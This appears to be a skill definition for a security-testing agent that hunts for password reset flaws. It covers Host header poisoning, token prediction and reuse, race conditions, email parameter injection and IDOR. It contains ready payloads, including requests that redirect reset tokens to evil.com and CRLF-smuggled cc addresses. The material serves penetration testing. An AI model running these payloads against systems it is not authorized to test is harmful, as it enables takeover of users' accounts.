---
name: hunt-password-reset
description: Password reset flow vulnerabilities — host header poisoning, token prediction, token reuse, race conditions on token validation, account takeover via reset.
triggers:
  - password reset
  - forgot password
  - reset token
  - reset link
  - account recovery
priority: 85
---

# hunt-password-reset — Password Reset Flow Testing

## Attack Surface

### 1. Host Header Poisoning
```
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@example.com"}
```
If the reset email contains `evil.com/reset?token=XXX`, the victim clicks it and the attacker receives the token.

Also try:
```
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com
Referer: https://evil.com
```

### 2. Token Predictability
- Request multiple reset tokens, analyze for patterns
- Check if tokens are sequential, timestamp-based, or short
- Test token entropy (< 32 chars of hex = potentially brutable)

### 3. Token Reuse / No Expiry
- Use a reset token, then try it again — does it still work?
- Request a new token — does the old one still work?
- Check token TTL — does it expire after reasonable time?

### 4. Race Condition on Token Validation
- Send multiple password-reset-confirm requests simultaneously with the same token but different passwords
- If multiple succeed, the token validation is not atomic

### 5. Email Parameter Manipulation
```json
{"email": ["victim@target.com", "attacker@evil.com"]}
{"email": "victim@target.com", "email": "attacker@evil.com"}
{"email": "victim@target.com%0acc:attacker@evil.com"}
{"email": "victim@target.com\ncc:attacker@evil.com"}
```

### 6. IDOR on Reset Endpoint
```
POST /reset-password
{"token": "valid_token", "user_id": "OTHER_USER_ID", "password": "newpass"}
```

## Validation
- Host header: show the email contains attacker-controlled domain
- Token prediction: demonstrate successful prediction/reuse
- Race condition: show multiple password changes from one token
- Must result in ACTUAL account takeover, not just token disclosure
